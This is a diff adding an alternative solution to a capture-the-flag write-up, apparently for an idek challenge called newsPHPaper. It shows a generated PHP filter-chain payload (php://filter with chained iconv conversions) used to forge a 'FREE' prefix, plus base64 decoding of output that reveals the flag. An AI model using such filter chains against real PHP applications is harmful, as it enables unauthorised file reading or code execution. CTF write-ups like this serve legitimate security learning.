@@ -89,3 +89,20 @@ Then removed the first 0, so we have:
 ```
 $)CPREMIUM - idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}€@CàÐÐø�ô�ô>�=�=€@CàÐÐø�ô�
 ```
+
+[OtherWay]
+
+```
+python3 php_filter_chain_generator.py --rawbase64 "FREE"
+php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM860.UTF16|convert.iconv.ISO-IR-143.ISO2022CNEXT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|/resource=php://temp
+```
+![image](https://user-images.githubusercontent.com/75846902/212599972-51276953-4d0c-468e-9b6e-bbc6184ccb23.png)
+![image](https://user-images.githubusercontent.com/75846902/212600001-948e073a-461c-4469-b409-204c3e817d21.png)
+
+```
+->$ echo "GyQpQ1BSRU1JVU0gLSBpZGVre1RoNG5rX1VfNF9TdWJzY1IxYjFuZ190MF9vdXJfbjN3c1BIUGFwZXIhfQ+-AD0APQ+-AD0APQ+-AD0APQ+-AD0APQ+AD0APQ-" | base64 --decode
+PREMIUM - idek{Th4nk_U_4_SubscR1b1ng_t0_our_n3wsPHPaper!}base64: invalid input
+```
+
+
+
